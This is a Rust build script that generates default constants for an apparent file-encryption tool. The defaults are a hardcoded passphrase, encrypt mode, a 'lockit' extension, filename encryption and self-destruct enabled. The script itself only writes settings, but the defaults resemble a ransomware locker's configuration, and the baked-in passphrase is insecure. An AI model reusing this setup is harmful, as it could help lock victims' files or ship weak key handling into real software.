use std::env;
use std::fs;
use std::path::PathBuf;

fn main() {
    let default_passphrase = "YourHardcodedPassphrase123!";
    
    let default_mode = "encrypt";

    let custom_extension = "lockit";

    let encrypt_filenames = true; 

    let self_destruct_default = true;

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = PathBuf::from(out_dir);

    fs::write(
        dest_path.join("default_settings.rs"),
        format!(
            "pub const DEFAULT_PASSPHRASE: &str = \"{}\";\n\
             pub const DEFAULT_MODE: &str = \"{}\";\n\
             pub const CUSTOM_EXTENSION: &str = \"{}\";\n\
             pub const ENCRYPT_FILENAMES: bool = {};\n\
             pub const SELF_DESTRUCT_DEFAULT: bool = {};",
            default_passphrase, default_mode, custom_extension, encrypt_filenames, self_destruct_default
        ),
    )
    .unwrap();
}
